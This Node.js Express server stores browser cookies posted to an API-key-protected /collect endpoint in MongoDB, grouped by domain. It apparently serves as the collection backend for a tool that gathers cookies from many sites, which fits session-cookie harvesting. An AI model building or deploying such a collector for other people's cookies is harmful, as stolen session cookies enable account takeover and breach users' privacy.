import express from "express";
import mongoose from "mongoose";
import dotenv from "dotenv";
import cors from "cors";

dotenv.config();

const app = express();
app.use(cors());
app.use(express.json({ limit: "10mb" }));

// ⭐ Connect to MongoDB
mongoose
  .connect(process.env.MONGO_URL)
  .then(() => console.log("MongoDB connected"))
  .catch(err => console.error("MongoDB error:", err));

// ⭐ Cookie schema
const CookieSchema = new mongoose.Schema({
  domain: String,
  cookies: Array,
  collectedAt: { type: Date, default: Date.now }
});

const CookieModel = mongoose.model("Cookie", CookieSchema);

// ⭐ Simple API key protection
app.post("/collect", async (req, res) => {
  try {
    const apiKey = req.headers["x-api-key"];

    if (!apiKey || apiKey !== process.env.MASTER_API_KEY) {
      return res.status(401).json({ error: "Unauthorized" });
    }

    const { domain, cookies } = req.body;

    await CookieModel.create({ domain, cookies });

    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ⭐ Root
app.get("/", (req, res) => {
  res.send("Cookie backend is running.");
});

// ⭐ Start server
const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log("Backend running on port", PORT));
